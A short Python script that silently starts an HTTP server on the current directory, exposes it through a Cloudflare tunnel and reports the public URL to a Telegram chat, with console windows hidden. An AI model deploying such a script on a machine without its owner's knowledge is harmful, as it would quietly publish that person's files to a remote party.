import subprocess
import requests
import time
import os

# Telegram Bot Credentials
BOT_TOKEN = "your_bot_token"
CHAT_ID = "your_chat_id"

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)

# Hide terminal windows
CREATE_NO_WINDOW = 0x08000000

# Start Python HTTP Server
send_telegram_message("🚀 Starting Python server on port 8000...")
server_process = subprocess.Popen(
    ["python", "-m", "http.server", "8000"],
    creationflags=CREATE_NO_WINDOW
)

# Start Cloudflare Tunnel
send_telegram_message("🌍 Starting Cloudflare tunnel...")
tunnel_process = subprocess.Popen(
    ["C:\\Program Files (x86)\\cloudflared\\cloudflared.exe", "tunnel", "--url", "http://localhost:8000"],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    creationflags=CREATE_NO_WINDOW
)

# Wait and Extract URL
time.sleep(5)
tunnel_url = None
for line in tunnel_process.stdout:
    decoded_line = line.decode()
    if "https://" in decoded_line:
        tunnel_url = decoded_line.strip().split(" ")[-1]
        break

if tunnel_url:
    send_telegram_message(f"✅ Server Live at: {tunnel_url}")
else:
    send_telegram_message("❌ Cloudflare Tunnel Failed!")
